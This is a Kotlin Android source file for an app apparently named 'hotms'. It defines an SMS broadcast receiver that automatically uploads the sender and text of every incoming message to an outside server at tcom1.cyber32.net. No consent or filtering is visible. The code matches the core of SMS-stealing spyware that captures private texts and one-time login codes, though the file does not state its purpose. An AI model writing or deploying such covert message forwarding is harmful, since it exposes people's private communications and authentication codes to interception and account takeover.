package tech.hotash.hotms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            Retrofit.Builder()
                .baseUrl("https://www.tcom1.cyber32.net/api/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
                .create(ApiService::class.java)
                .sendBulk(messages.map { SmsData(it.originatingAddress, it.messageBody) })
                .enqueue(object : Callback<ResponseBody> {
                    override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                        // Handle response
                        Log.d("SMS", "Sent to server")
                    }

                    override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                        // Handle failure
                        Log.e("SMS", "Failed to send to server")
                    }
                })
            


//            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
//                val messageBody = smsMessage.messageBody
//                val sender = smsMessage.originatingAddress
//                sendToServer(context, sender, messageBody)
//            }
        }
    }

    private fun sendToServer(context: Context, sender: String?, message: String) {
        Log.d("SMS", "Received from $sender: $message")
        val retrofit = Retrofit.Builder()
            .baseUrl("https://www.tcom1.cyber32.net/api/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service = retrofit.create(ApiService::class.java)
        val call = service.sendSms(SmsData(sender, message))
        call.enqueue(object : Callback<ResponseBody> {
            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                // Handle response
                Log.d("SMS", "Sent to server")
            }

            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                // Handle failure
                Log.e("SMS", "Failed to send to server")
            }
        })
    }
}

interface ApiService {
    @POST("sms")
    fun sendSms(@Body smsData: SmsData): Call<ResponseBody>

    @POST("bulk")
    fun sendBulk(@Body smsData: List<SmsData>): Call<ResponseBody>
}

data class SmsData(val sender: String?, val message: String)
